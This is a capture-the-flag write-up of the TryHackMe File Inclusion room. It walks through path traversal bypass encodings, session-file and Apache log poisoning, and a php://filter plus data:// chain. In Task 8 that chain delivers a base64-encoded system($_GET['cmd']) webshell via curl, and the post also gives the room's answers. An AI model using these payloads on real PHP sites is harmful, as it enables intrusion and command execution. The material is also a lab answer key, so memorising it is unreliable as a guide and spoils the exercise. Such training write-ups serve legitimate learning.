---
title: "TryHackMe File Inclusion: from path traversal to code execution"
date: 2026-10-19T11:45:00+05:30
lastmod: 2026-10-19T11:45:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-fpt/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - file inclusion
  - path traversal
  - LFI
  - RFI
  - PHP wrappers
  - log poisoning
  - web application pentesting
  - advanced server-side attacks

draft: false
description: "TryHackMe File Inclusion walkthrough: relative and absolute path traversal, PHP wrapper code execution via base64 decode, and log poisoning to RCE."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|File Inclusion, Path Traversal |![File Inclusion room icon](https://cdn-images.tryhackme.com/room-icons/fa8d519b76b29da0c7abb5afa1e7185f.png)|

This medium-difficulty room in the Web Application Pentesting path covers all three flavours of file inclusion: local file inclusion with path traversal, remote file inclusion, and the escalation from file reads to code execution through PHP wrappers and log poisoning. It sits in the Advanced Server-Side Attacks module alongside the [SSRF walkthrough](/post/thm-room-ssrfhr/) and the [SSTI walkthrough](/post/thm-room-ssti/).

## Task 1: Introduction

Deploy the target VM. The lab application is a PHP site called "FilePath Lab" with four pages: Home, Playground, LFI, and RFI. Each page uses a `page` GET parameter passed to `include()` with different levels of filtering.

## Task 2: Web Application Architecture

Theory on how web applications handle file operations on the backend. The `include()` function in PHP loads a file and executes any PHP code inside it. When the filename comes from user input without validation, it becomes an inclusion vulnerability.

## Task 3: File Inclusion Types

Two kinds of pathing matter for file inclusion attacks:

**Relative pathing** locates files based on the current directory. An include like `include('./folder/file.php')` resolves relative to wherever the script runs. Traversal sequences (`../`) walk up the directory tree from that starting point.

**Absolute pathing** specifies the file's complete path from the root directory: `/var/www/html/folder/file.php`. No traversal needed when the attacker knows (or can guess) the full path to the target file.

Remote File Inclusion (RFI) pulls a file from an external URL when `allow_url_include` is on. Local File Inclusion (LFI) reads from the local filesystem and can escalate to RCE through log poisoning or PHP wrappers.

### Answers

- **What kind of pathing refers to locating files based on the current directory?** **Relative Pathing**
- **What kind of pathing involves the file's complete path, which usually starts from the root directory?** **Absolute Pathing**

## Task 4: PHP Wrappers

**PHP wrappers** give access to various I/O streams through built-in protocols. The `php://filter` wrapper is the most useful for file inclusion attacks because it transforms file content on the fly.

Reading source code through base64 encoding:

```
php://filter/convert.base64-encode/resource=/etc/passwd
```

This returns the base64-encoded content of `/etc/passwd`, which the attacker decodes offline. Without the filter, including a PHP file would execute it instead of displaying its source.

The room also covers string filters (`string.rot13`, `string.toupper`, `string.tolower`, `string.strip_tags`) and the `data://` wrapper for inline code execution, which becomes critical in Task 8.

### Answers

- **What part of PHP's functionality allows users access to various data streams that can also access or execute code through built-in protocols?** **PHP wrappers**

{{< ad >}}

## Task 5: Base Directory Breakouts

The LFI page (`lfi.php`) restricts traversal with a two-part check:

```php
function containsStr($str, $subStr){
    return strpos($str, $subStr) !== false;
}

if(!containsStr($_GET['page'], '../..') && containsStr($_GET['page'], '/var/www/html')){
    include $_GET['page'];
}else{
    echo 'You are not allowed to go outside /var/www/html/ directory!';
}
```

The filter blocks `../..` as a substring and requires `/var/www/html` in the path. Three bypass techniques:

1. **URL encoding**: `%2e%2e%2f` decodes to `../` on the server side, bypassing the string check
2. **Double encoding**: `%252e%252e%252f` when the application decodes input twice
3. **Obfuscation**: `....//config.php` strips the apparent traversal but resolves to `../config.php` because `//` collapses to `/`

## Task 6: LFI2RCE via Session Files

PHP stores session data in files under `/var/lib/php/sessions/` (or `/tmp`). If the application writes user-controlled input into a session variable, an attacker can inject PHP code into the session file and then include it through LFI.

The attack chain: visit `sessions.php?page=<?php echo phpinfo(); ?>`, which stores the PHP code in the session file. Then include the session file via `sessions.php?page=/var/lib/php/sessions/sess_<PHPSESSID>`, and the server executes the injected code.

## Task 7: LFI2RCE via Log Poisoning

**Log poisoning** injects executable code into a web server's log file, then uses an LFI vulnerability to include and execute the log. The attacker sends a raw request containing PHP code (for example, via Netcat to port 80), and Apache writes it into `access.log`. Including the log file with LFI executes the injected PHP.

```
$ nc 10.48.188.41 80
<?php echo phpinfo(); ?>
HTTP/1.1 400 Bad Request
```

The malformed request gets logged. Including `/var/log/apache2/access.log` through the playground's `page` parameter executes the embedded `phpinfo()`.

### Answers

- **What technique does an attacker use to inject executable code into a web server's log file and then use a file inclusion vulnerability to include and execute the malicious code?** **log poisoning**

## Task 8: LFI2RCE via PHP Wrappers

The exploitation task. The playground page (`playground.php`) has a raw `include()` with no filtering:

```php
if(isset($_GET['page'])){
    include($_GET['page']);
}else{
    include 'menu.php';
}
```

Although `allow_url_include` is off, the `php://filter` wrapper combined with `data://` bypasses the restriction. The payload chain:

```
php://filter/convert.base64-decode/resource=data://plain/text,<base64_payload>
```

The base64 payload encodes `<?php system($_GET['cmd']); echo 'Shell done!'; ?>`. When the server processes this, it base64-decodes the string and executes the PHP code, giving command execution through the `cmd` parameter.

Listing the flags directory:

```bash
curl -s "http://10.48.188.41/playground.php?page=php://filter/convert.base64-decode/\
resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7\
ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4%2B&cmd=ls+-la+/var/www/html/flags/"
  # cd3c67e5079de2700af6cea0a405f9cc.txt
  # index.html
```

Reading the hidden file:

```bash
curl -s "http://10.48.188.41/playground.php?page=...&cmd=cat+/var/www/html/flags/\
cd3c67e5079de2700af6cea0a405f9cc.txt"
  # THM{fl4g_cd3c67e5079de2700af6cea0a405f9cc}
```

The `index.html` in the flags directory is a red herring (empty file to prevent directory listing). The actual flag lives in a text file named with an MD5 hash.

### Source code comparison

Reading the source of each page via `php://filter/convert.base64-encode` revealed the filtering differences:

- **playground.php**: raw `include($_GET['page'])`, no validation
- **lfi.php**: blocks `../..` and requires `/var/www/html` in the path
- **rfi.php**: regex blocks `data://`, `http://`, `https://`, `ftp://` URLs but has `allow_url_include` enabled

### Answers

- **What is the content of the hidden text file in the flags folder?** **THM{fl4g_[REDACTED]}**

## Task 9: Conclusion

Room complete.

## Takeaways

**Every `include()` with user input is a code execution surface, not just a file read.** The playground page had no filtering at all, and even the "protected" LFI page could be bypassed with encoding tricks. The three pages demonstrated a spectrum from zero defence to partial defence, and none was sufficient. Input validation on filenames is necessary but not sufficient; allowlisting specific includable files is the only robust control.

**PHP wrappers turn a local file read into arbitrary code execution without needing `allow_url_include`.** The `php://filter` chain decoded a base64 payload from a `data://` URI, bypassing the disabled remote include setting entirely. This is not a misconfiguration exploit; it is a feature of PHP's stream wrapper system. Disabling `allow_url_include` stops direct URL includes but does nothing against wrapper chains that process inline data.

Room solved 100%: 9 tasks, 7 answers.
